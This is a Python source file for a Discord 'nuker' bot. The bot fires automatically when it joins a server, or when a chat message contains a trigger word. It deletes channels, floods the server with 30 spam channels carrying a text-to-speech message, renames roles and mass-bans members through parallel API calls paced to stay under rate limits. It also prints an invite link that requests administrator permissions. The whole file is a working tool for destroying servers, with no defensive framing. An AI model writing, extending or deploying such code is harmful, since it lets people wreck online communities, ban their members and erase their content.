import sys
import config
import aiohttp
import asyncio
import disnake
from disnake.ext import commands

async def nuke(guild:disnake.Guild):
    async with aiohttp.ClientSession(headers={"authorization": f"Bot {client.ws.token}"}) as session:
        async def roles():
            if guild.me.guild_permissions.manage_roles:
                for i in range(60):
                    roles = list(filter(lambda role: guild.me.top_role.position > role.position and role.id != guild.default_role.id, guild.roles))
                    for chunk in [roles[i:i+5] for i in range(0, len(roles), 5)]:
                        await asyncio.gather(*[session.patch(url=f"https://discord.com/api/v9/guilds/{guild.id}/roles/{role.id}", json={"reason": config.Nuker.Naming.reason, "name": config.Nuker.Naming.role_name}) for role in chunk])
                        await asyncio.sleep(1.25)
                    await asyncio.sleep(1)
        async def members():
            if guild.me.guild_permissions.ban_members:
                for i in range(60):
                    members = list(filter(lambda member: guild.me.top_role.position > member.top_role.position, guild.members))
                    for chunk in [members[i:i+10] for i in range(0, len(members), 10)]:
                        await asyncio.gather(*[session.put(url=f"https://discord.com/api/v9/guilds/{guild.id}/bans/{member.id}", json={"reason": config.Nuker.Naming.reason}) for member in chunk])
                        await asyncio.sleep(1.25)
                    await asyncio.sleep(1)
        if guild.me.guild_permissions.manage_channels:
            channels = list(filter(lambda channel: channel.name != config.Nuker.Naming.channel_name, guild.channels))
            for chunk in [channels[i:i+50] for i in range(0, len(channels), 50)]:
                await asyncio.gather(*[session.delete(url=f"https://discord.com/api/v9/channels/{channel.id}", json={"reason": config.Nuker.Naming.reason}) for channel in chunk])
                await asyncio.sleep(1.25)
            await asyncio.gather(*[session.post(url=f"https://discord.com/api/v9/guilds/{guild.id}/channels", json={"reason": config.Nuker.Naming.reason, "name": config.Nuker.Naming.channel_name, "topic": config.Nuker.Naming.channel_topic}) for i in range(30)])
        await asyncio.sleep(1.25) 
        await asyncio.gather(*[roles(), members()])

client = commands.InteractionBot(intents=config.Client.intents, command_sync_flags=config.Client.command_sync_flags)

@client.event
async def on_ready():
    print(f"{client.user} ({client.user.id}) : https://discord.com/oauth2/authorize?client_id={client.user.id}&permissions=8&integration_type=0&scope=bot")
    
@client.event
async def on_guild_join(guild:disnake.Guild):
    if config.Nuker.auto_activation[0] and not guild.id in config.Nuker.auto_activation[1]:
        await nuke(guild)

@client.event
async def on_guild_channel_create(channel:disnake.TextChannel):
    if channel.name == config.Nuker.Naming.channel_name:
        await channel.send(content=config.Nuker.Message.content, embed=config.Nuker.Message.embed, tts=True)
        
@client.event
async def on_message(message:disnake.Message):
    if config.Nuker.manual_activation[0] and not message.guild.id in config.Nuker.manual_activation[1]:
        if any([trigger.lower() in message.content.lower() for trigger in config.Nuker.manual_activation[2]]):
            await nuke(message.guild)
            
def main():
    if "--debug" in sys.argv:
        print("connecting via debug token")
        client.run(config.Client.Auth.debug)
    else:
        print("connecting via release token")
        client.run(config.Client.Auth.release)
    
if __name__ == "__main__":
    main()